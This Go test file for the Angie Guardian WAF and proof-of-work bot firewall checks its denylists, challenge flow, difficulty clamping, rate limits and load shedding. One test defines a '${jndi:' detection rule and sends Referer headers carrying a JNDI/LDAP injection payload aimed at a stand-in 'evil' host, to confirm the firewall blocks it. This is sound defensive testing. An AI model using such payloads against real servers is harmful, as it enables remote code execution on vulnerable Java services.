// Angie Guardian — WAF + proof-of-work bot firewall for Angie.
// Copyright (C) 2026 Melroy van den Berg
// SPDX-License-Identifier: AGPL-3.0-or-later

package httptransport

import (
	"bytes"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"math/bits"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"testing"
	"time"

	"github.com/melroy89/angie-guardian/core"
	"github.com/melroy89/angie-guardian/core/pow"
	"github.com/melroy89/angie-guardian/core/store"
)

const testYAML = `
store: { backend: memory }
signing_key_file: test-signing.key
defaults:
  allowlist:
    paths: [ "/robots.txt" ]
  denylist:
    ips: [ "203.0.113.0/24" ]
domains:
  html.test:
    pow: { enabled: true, base_difficulty: 1, max_difficulty: 6, noscript_fallback: true }
`

func testServer(t *testing.T) *httptest.Server {
	t.Helper()
	return testServerWithYAML(t, testYAML)
}

func testServerWithYAML(t *testing.T, yaml string) *httptest.Server {
	t.Helper()
	ts, _ := testServerAndHandler(t, yaml)
	return ts
}

func testServerAndHandler(t *testing.T, yaml string) (*httptest.Server, *Server) {
	t.Helper()
	path := filepath.Join(t.TempDir(), "guardian.yaml")
	if err := os.WriteFile(path, []byte(yaml), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := core.LoadConfig(path)
	if err != nil {
		t.Fatal(err)
	}
	st := store.NewMemory()
	t.Cleanup(func() { st.Close() })
	key, err := pow.LoadOrCreateKey(filepath.Join(t.TempDir(), "ed25519.key"))
	if err != nil {
		t.Fatal(err)
	}
	mgr := pow.NewManager(key, st)
	mgr.NoJSMinDelay = 50 * time.Millisecond
	engine, err := core.NewEngine(cfg, st, mgr, slog.Default())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(engine.Close)
	h := New(engine, mgr, st, nil, slog.Default())
	ts := httptest.NewServer(h)
	t.Cleanup(ts.Close)
	return ts, h
}

// client that does not follow redirects, so the no-JS 303 can be inspected.
var noRedirect = &http.Client{
	CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
}

func do(t *testing.T, method, url string, headers map[string]string, body []byte) *http.Response {
	t.Helper()
	var rdr io.Reader
	if body != nil {
		rdr = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, url, rdr)
	if err != nil {
		t.Fatal(err)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := noRedirect.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { resp.Body.Close() })
	return resp
}

func guardianHeaders(host, ip, uri, ua string) map[string]string {
	return map[string]string{
		"X-Guardian-Host":   host,
		"X-Guardian-Method": "GET",
		"X-Guardian-URI":    uri,
		"X-Guardian-IP":     ip,
		"X-Guardian-UA":     ua,
	}
}

func TestAuthEndpoint(t *testing.T) {
	ts := testServer(t)

	// Clean request on a non-PoW host → allow.
	resp := do(t, "GET", ts.URL+"/auth", guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0"), nil)
	if resp.StatusCode != http.StatusOK || resp.Header.Get("X-Guardian-Action") != "allow" {
		t.Fatalf("allow: status = %d action = %q", resp.StatusCode, resp.Header.Get("X-Guardian-Action"))
	}

	// Denylisted IP → 403.
	resp = do(t, "GET", ts.URL+"/auth", guardianHeaders("plain.test", "203.0.113.9", "/page", "curl"), nil)
	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Reason") != "denylist:ip" {
		t.Fatalf("deny: status = %d reason = %q", resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
	}

	// Denylisted IP on an allowlisted path → allow.
	resp = do(t, "GET", ts.URL+"/auth", guardianHeaders("plain.test", "203.0.113.9", "/robots.txt", "curl"), nil)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("allowlisted path: status = %d, want 200", resp.StatusCode)
	}
}

// TestAuthHeaderAndMethodRules proves the auth endpoint feeds the WAF what
// header/method rules need: a header:referer rule fires on the Referer the
// auth subrequest inherits from the client, and a methods-only rule fires on
// the method relayed via X-Guardian-Method.
func TestAuthHeaderAndMethodRules(t *testing.T) {
	rules := filepath.Join(t.TempDir(), "rules.yaml")
	if err := os.WriteFile(rules, []byte(`rules:
  - id: jndi-header
    targets: [ "header:referer" ]
    keywords: [ "${jndi:" ]
  - id: no-track
    methods: [ TRACK ]
`), 0o600); err != nil {
		t.Fatal(err)
	}
	ts := testServerWithYAML(t, fmt.Sprintf(`store: { backend: memory }
defaults:
  waf: { keywords: { enabled: true, rules_file: "%s" } }
`, rules))

	// Clean request: allowed.
	resp := do(t, "GET", ts.URL+"/auth", guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0"), nil)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("clean: status = %d, want 200", resp.StatusCode)
	}

	// Same request with a JNDI payload in the Referer: denied by the header rule.
	h := guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0")
	h["Referer"] = "https://example.com/?x=${jndi:ldap://evil/a}"
	resp = do(t, "GET", ts.URL+"/auth", h, nil)
	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Reason") != "waf:jndi-header" {
		t.Fatalf("jndi referer: status = %d reason = %q, want 403 waf:jndi-header",
			resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
	}

	// net/http preserves duplicate field values. The WAF must inspect all of
	// them instead of trusting only the first occurrence.
	req, err := http.NewRequest(http.MethodGet, ts.URL+"/auth", nil)
	if err != nil {
		t.Fatal(err)
	}
	for k, v := range guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0") {
		req.Header.Set(k, v)
	}
	req.Header.Add("Referer", "https://example.com/")
	req.Header.Add("Referer", "${jndi:ldap://evil/a}")
	resp, err = http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { resp.Body.Close() })
	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Reason") != "waf:jndi-header" {
		t.Fatalf("duplicate referer: status = %d reason = %q, want 403 waf:jndi-header",
			resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
	}

	// A TRACK request (relayed method, the subrequest itself is GET): denied.
	h = guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0")
	h["X-Guardian-Method"] = "TRACK"
	resp = do(t, "GET", ts.URL+"/auth", h, nil)
	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Reason") != "waf:no-track" {
		t.Fatalf("TRACK: status = %d reason = %q, want 403 waf:no-track",
			resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
	}
}

var dataRe = regexp.MustCompile(`<script id="guardian-data" type="application/json">(.*?)</script>`)

func fetchChallenge(t *testing.T, ts *httptest.Server, ip, ua string) (id, challenge string, difficulty int) {
	t.Helper()
	resp := do(t, "GET", ts.URL+"/challenge", guardianHeaders("html.test", ip, "/original?q=1", ua), nil)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("challenge page: status = %d, want 200", resp.StatusCode)
	}
	page, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatal(err)
	}
	m := dataRe.FindSubmatch(page)
	if m == nil {
		t.Fatalf("no guardian-data JSON found in challenge page:\n%s", page)
	}
	var data struct {
		ChallengeID string `json:"challenge_id"`
		Challenge   string `json:"challenge"`
		Difficulty  int    `json:"difficulty_bits"`
		PassURL     string `json:"pass_url"`
	}
	if err := json.Unmarshal(m[1], &data); err != nil {
		t.Fatalf("guardian-data is not valid JSON: %v", err)
	}
	if data.PassURL != PassPath {
		t.Errorf("pass_url = %q, want %q", data.PassURL, PassPath)
	}
	return data.ChallengeID, data.Challenge, data.Difficulty
}

// solve brute-forces a nonce with `difficulty` leading zero bits, the check
// core/pow's leadingZeroBits performs.
func solve(t *testing.T, challenge string, difficulty int) string {
	t.Helper()
	for n := 0; n < 1_000_000; n++ {
		nonce := strconv.Itoa(n)
		sum := sha256.Sum256([]byte(challenge + nonce))
		zeros := 0
		for _, b := range sum {
			if b == 0 {
				zeros += 8
				continue
			}
			zeros += bits.LeadingZeros8(b)
			break
		}
		if zeros >= difficulty {
			return nonce
		}
	}
	t.Fatal("no nonce found")
	return ""
}

// TestPoWFlowEndToEnd walks the full browser journey: challenged, solves,
// redeems, gets a cookie, and is vouched for on the next request.
func TestPoWFlowEndToEnd(t *testing.T) {
	ts := testServer(t)
	ip, ua := "198.51.100.7", "Mozilla/5.0 (X11; Linux x86_64)"

	// 1. Unvouched browser → 401 challenge.
	resp := do(t, "GET", ts.URL+"/auth", guardianHeaders("html.test", ip, "/original?q=1", ua), nil)
	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("step 1: status = %d, want 401", resp.StatusCode)
	}
	// base_difficulty 1 on the config scale = 4 leading zero bits.
	if resp.Header.Get("X-Guardian-Action") != "challenge" || resp.Header.Get("X-Guardian-Difficulty") != "4" {
		t.Fatalf("step 1: headers action=%q difficulty=%q", resp.Header.Get("X-Guardian-Action"), resp.Header.Get("X-Guardian-Difficulty"))
	}

	// 2. Challenge page + 3. solve.
	id, challenge, difficulty := fetchChallenge(t, ts, ip, ua)
	nonce := solve(t, challenge, difficulty)

	// 4. Redeem.
	body, _ := json.Marshal(map[string]any{"challenge_id": id, "nonce": nonce, "elapsed_ms": 42})
	resp = do(t, "POST", ts.URL+"/pass", guardianHeaders("html.test", ip, "/original?q=1", ua), body)
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		t.Fatalf("step 4: status = %d body = %s", resp.StatusCode, b)
	}
	var cookie string
	for _, c := range resp.Cookies() {
		if c.Name == pow.CookieName {
			cookie = c.Value
			if !c.HttpOnly || !c.Secure || c.Path != "/" {
				t.Errorf("cookie flags: HttpOnly=%v Secure=%v Path=%q", c.HttpOnly, c.Secure, c.Path)
			}
			if c.MaxAge != int((4 * time.Hour).Seconds()) {
				t.Errorf("cookie MaxAge = %d, want %d", c.MaxAge, int((4 * time.Hour).Seconds()))
			}
		}
	}
	if cookie == "" {
		t.Fatal("step 4: no guardian_token cookie set")
	}

	// 5. Vouched request → allow.
	h := guardianHeaders("html.test", ip, "/next", ua)
	h["X-Guardian-Cookie"] = pow.CookieName + "=" + cookie
	resp = do(t, "GET", ts.URL+"/auth", h, nil)
	if resp.StatusCode != http.StatusOK || resp.Header.Get("X-Guardian-Reason") != "pow:token" {
		t.Fatalf("step 5: status = %d reason = %q", resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
	}

	// 6. Replaying the spent challenge must fail.
	resp = do(t, "POST", ts.URL+"/pass", guardianHeaders("html.test", ip, "/original?q=1", ua), body)
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("step 6: replay status = %d, want 403", resp.StatusCode)
	}
}

func TestNoJSFlow(t *testing.T) {
	ts := testServer(t)
	ip, ua := "198.51.100.8", "Mozilla/5.0"
	id, _, _ := fetchChallenge(t, ts, ip, ua)

	url := fmt.Sprintf("%s%s?cid=%s&nojs=1", ts.URL, PassPath, id)

	// Too fast → rejected.
	resp := do(t, "GET", url, guardianHeaders("html.test", ip, "/", ua), nil)
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("instant no-JS: status = %d, want 403", resp.StatusCode)
	}

	time.Sleep(100 * time.Millisecond)
	resp = do(t, "GET", url, guardianHeaders("html.test", ip, "/", ua), nil)
	if resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("no-JS redeem: status = %d, want 303", resp.StatusCode)
	}
	if loc := resp.Header.Get("Location"); loc != "/original?q=1" {
		t.Errorf("redirect = %q, want original URI", loc)
	}
	found := false
	for _, c := range resp.Cookies() {
		if c.Name == pow.CookieName && c.Value != "" {
			found = true
		}
	}
	if !found {
		t.Error("no-JS redeem: no cookie set")
	}
}

// TestChallengeDifficultyHeader covers the escalation relay: Angie passes the
// auth decision's difficulty to /challenge via X-Guardian-Difficulty, and the
// issued challenge honors it, clamped to the domain's [base, max] bits so a
// client forging the header can never lower its own difficulty.
func TestChallengeDifficultyHeader(t *testing.T) {
	ts := testServer(t)
	// html.test: base_difficulty 1 (4 bits), max_difficulty 6 (24 bits).
	// Distinct IPs per case keep the per-IP unsolved-challenge escalation
	// (TestChallengeIssuanceEscalation) out of these assertions.
	cases := map[string]struct {
		ip     string
		header string
		want   int
	}{
		"absent header issues base":  {"198.51.100.20", "", 4},
		"escalated value honored":    {"198.51.100.21", "12", 12},
		"below base clamps up":       {"198.51.100.22", "2", 4},
		"above max clamps down":      {"198.51.100.23", "99", 24},
		"garbage falls back to base": {"198.51.100.24", "lol", 4},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			h := guardianHeaders("html.test", tc.ip, "/x", "Mozilla/5.0")
			if tc.header != "" {
				h["X-Guardian-Difficulty"] = tc.header
			}
			resp := do(t, "GET", ts.URL+"/challenge", h, nil)
			page, _ := io.ReadAll(resp.Body)
			m := dataRe.FindSubmatch(page)
			if m == nil {
				t.Fatalf("no guardian-data in page (status %d)", resp.StatusCode)
			}
			var data struct {
				Difficulty int `json:"difficulty_bits"`
			}
			if err := json.Unmarshal(m[1], &data); err != nil {
				t.Fatal(err)
			}
			if data.Difficulty != tc.want {
				t.Errorf("difficulty_bits = %d, want %d", data.Difficulty, tc.want)
			}
		})
	}
}

// TestChallengeIssuanceEscalation: an IP that keeps fetching challenges
// without solving any pays progressively more work (a small allowance is
// free, then +1 bit per two abandoned challenges), and one successful solve
// resets it back to base.
func TestChallengeIssuanceEscalation(t *testing.T) {
	ts := testServer(t)
	ip, ua := "198.51.100.60", "Mozilla/5.0"

	// html.test base is 4 bits; free allowance 4, step 2:
	// issuances 1..5 stay at base, 6-7 pay +1 bit, 8 pays +2.
	want := []int{4, 4, 4, 4, 4, 5, 5, 6}
	var id, challenge string
	var difficulty int
	for i, w := range want {
		id, challenge, difficulty = fetchChallenge(t, ts, ip, ua)
		if difficulty != w {
			t.Fatalf("issuance %d: difficulty_bits = %d, want %d", i+1, difficulty, w)
		}
	}

	// Solving the last challenge clears the counter...
	body, _ := json.Marshal(map[string]any{"challenge_id": id, "nonce": solve(t, challenge, difficulty)})
	resp := do(t, "POST", ts.URL+"/pass", guardianHeaders("html.test", ip, "/", ua), body)
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		t.Fatalf("redeem: status = %d body = %s", resp.StatusCode, b)
	}

	// ...so the next challenge is back at base difficulty.
	if _, _, d := fetchChallenge(t, ts, ip, ua); d != 4 {
		t.Fatalf("difficulty after solve = %d bits, want base 4 (counter reset)", d)
	}

	// An unrelated IP was never escalated.
	if _, _, d := fetchChallenge(t, ts, "198.51.100.61", ua); d != 4 {
		t.Fatalf("fresh ip difficulty = %d bits, want base 4", d)
	}
}

// TestCookieSecureFollowsProto: over plain http (X-Guardian-Proto: http, set
// by the Angie glue from $scheme) the token cookie must not carry Secure, or
// the browser would never send it back and the client would loop on the
// challenge. Any other value, or no header at all, keeps Secure on.
func TestCookieSecureFollowsProto(t *testing.T) {
	ts := testServer(t)
	ip, ua := "198.51.100.21", "Mozilla/5.0"

	id, challenge, difficulty := fetchChallenge(t, ts, ip, ua)
	body, _ := json.Marshal(map[string]any{"challenge_id": id, "nonce": solve(t, challenge, difficulty)})
	h := guardianHeaders("html.test", ip, "/", ua)
	h["X-Guardian-Proto"] = "http"
	resp := do(t, "POST", ts.URL+"/pass", h, body)
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		t.Fatalf("redeem: status = %d body = %s", resp.StatusCode, b)
	}
	for _, c := range resp.Cookies() {
		if c.Name == pow.CookieName && c.Secure {
			t.Error("cookie is Secure on a plain-http request; the browser would never send it back")
		}
	}
	// The Secure default (no proto header) is asserted in TestPoWFlowEndToEnd.
}

func TestChallengeRateLimit(t *testing.T) {
	ts := testServer(t)
	h := guardianHeaders("html.test", "198.51.100.9", "/", "Mozilla/5.0")
	// The default pow.issuance_rate_limit is 60/min.
	const defaultLimit = 60
	var last int
	for i := 0; i < defaultLimit+5; i++ {
		resp := do(t, "GET", ts.URL+"/challenge", h, nil)
		io.Copy(io.Discard, resp.Body)
		last = resp.StatusCode
	}
	if last != http.StatusTooManyRequests {
		t.Fatalf("after %d issuances: status = %d, want 429", defaultLimit+5, last)
	}
}

func TestLoadSheddingPassesTokenHolders(t *testing.T) {
	const shedYAML = `
store: { backend: memory }
signing_key_file: k
attack_mode: { enabled: true, effects: { max_inflight: 1 } }
defaults:
  pow: { enabled: true, mode: always, base_difficulty: 2, max_difficulty: 4 }
  denylist: { ips: [ "203.0.113.66" ] }
domains:
  html.test: { pow: { enabled: true } }
`
	ts, h := testServerAndHandler(t, shedYAML)
	ip, ua := "198.51.100.7", "Mozilla/5.0"

	// Mint a real token by solving one challenge.
	id, challenge, difficulty := fetchChallenge(t, ts, ip, ua)
	body, _ := json.Marshal(map[string]any{"challenge_id": id, "nonce": solve(t, challenge, difficulty)})
	resp := do(t, "POST", ts.URL+"/pass", guardianHeaders("html.test", ip, "/", ua), body)
	var cookie string
	for _, c := range resp.Cookies() {
		if c.Name == pow.CookieName {
			cookie = c.Value
		}
	}
	if cookie == "" {
		t.Fatal("could not mint a token")
	}

	// Saturate: push the in-flight counter to the bound so the shed branch runs.
	h.inflight.Add(1)
	defer h.inflight.Add(-1)

	// A tokenless request is shed. On the auth subrequest that is a 403 with
	// X-Guardian-Action: shed (Angie maps that to a real 503 + Retry-After;
	// auth_request would turn a bare 503 into a 500 and route it to the
	// backend, so the sidecar must speak a status auth_request forwards).
	resp = do(t, "GET", ts.URL+"/auth", guardianHeaders("html.test", "203.0.113.50", "/page", ua), nil)
	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Action") != "shed" {
		t.Fatalf("tokenless under saturation: status = %d action = %q, want 403 + action=shed",
			resp.StatusCode, resp.Header.Get("X-Guardian-Action"))
	}

	// A token holder still passes (cheap stateless check, no store).
	th := guardianHeaders("html.test", ip, "/page", ua)
	th["X-Guardian-Cookie"] = pow.CookieName + "=" + cookie
	resp = do(t, "GET", ts.URL+"/auth", th, nil)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("token holder under saturation: status = %d, want 200", resp.StatusCode)
	}

	// A denylisted IP is DENIED even holding a token: the shed fast path must
	// not bypass the terminal pre-token checks. Craft a token bound to the
	// denylisted IP so the only thing that could wave it through is the token
	// check.
	dIP := "203.0.113.66"
	dID, dCh, dDiff := fetchChallenge(t, ts, dIP, ua)
	dBody, _ := json.Marshal(map[string]any{"challenge_id": dID, "nonce": solve(t, dCh, dDiff)})
	dResp := do(t, "POST", ts.URL+"/pass", guardianHeaders("html.test", dIP, "/", ua), dBody)
	var dCookie string
	for _, c := range dResp.Cookies() {
		if c.Name == pow.CookieName {
			dCookie = c.Value
		}
	}
	dh := guardianHeaders("html.test", dIP, "/page", ua)
	dh["X-Guardian-Cookie"] = pow.CookieName + "=" + dCookie
	resp = do(t, "GET", ts.URL+"/auth", dh, nil)
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("denylisted token holder under saturation: status = %d, want 403 (shed must not bypass the denylist)", resp.StatusCode)
	}
}

func TestAuxiliaryEndpoints(t *testing.T) {
	ts := testServer(t)

	for _, tc := range []struct {
		path   string
		status int
	}{
		{"/healthz", http.StatusOK},
		{"/challenge", http.StatusServiceUnavailable}, // PoW disabled for unknown hosts
		{"/denied", http.StatusForbidden},
	} {
		resp := do(t, "GET", ts.URL+tc.path, nil, nil)
		io.Copy(io.Discard, resp.Body)
		if resp.StatusCode != tc.status {
			t.Errorf("%s: status = %d, want %d", tc.path, resp.StatusCode, tc.status)
		}
	}

	// /pass on a PoW-disabled host is unavailable.
	resp := do(t, "POST", ts.URL+"/pass", map[string]string{"Content-Type": "application/json"}, []byte(`{"challenge_id":"x","nonce":"1"}`))
	if resp.StatusCode != http.StatusServiceUnavailable {
		t.Errorf("/pass on non-PoW host: status = %d, want 503", resp.StatusCode)
	}
}
